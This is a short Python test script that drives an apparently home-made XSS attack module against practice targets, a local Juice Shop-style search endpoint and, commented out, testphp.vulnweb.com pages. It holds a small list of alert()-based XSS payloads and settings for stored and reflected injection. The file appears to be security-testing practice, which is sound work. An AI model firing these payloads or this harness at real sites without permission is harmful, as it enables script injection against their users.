#simple test file for start of xss logic

from xss_attack.xss_logic import xss_attack

#xss target test
# target = {
#     "sanitizes_input": False,
#     "stores_input": True,
#     "output_escaped": False,
#     "content_security_on": False
# }

#xss config test
# xss_config = {
#         "xss_type": "stored",
#         "payloads": ["javascript:", "<script>alert('test')</script>", 
#             "<script>alert('XSS')</script>", 
#             "';alert('XSS');//", "<img src='x' onerror='alert(1)'>", 
#             "javascript:alert('XSS')"]
# }

#New: added mutliple targets used for testing xss injection
target = {
    # "url": "https://testphp.vulnweb.com/search.php",
    # "param": "search"
    # "url": "https://testphp.vulnweb.com/comment.php",
    # "param": "comment"
    
    "url": "http://localhost:3000/rest/products/search",
    "param": "q"
    # "url": "http://localhost:3000/rest/user/login",
    # "param": "email"
    # "url": "http://localhost:3000/api/Feedbacks",
    # "param": "comment"
}

#New code: adjusted ss config for testing based on updated logic
xss_config = {
    #"xss_type": "reflected",
    "xss_type": "stored",
    "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>"
    ],
    "attempts": 3,
    "rate_limit": 1,
    "dry_run": False,
    "crawl": False
}

#gets xss test result
result = xss_attack(target, xss_config)

#prints the results and the logs of the test
print("Attack Result:")
#New code for printing more resutls for the cli test based on updated logic
print(result["vulnerability"])
print("Attempts:", result["attempts"])
print("Successful:", result["successful_count"])
print("Time:", result["xss_time"])
#-end

print("\nAttack Log:")
for part in result["xss_log"]:
    print(" - ", part)


#python3 xss_attack/test_xss_cli.py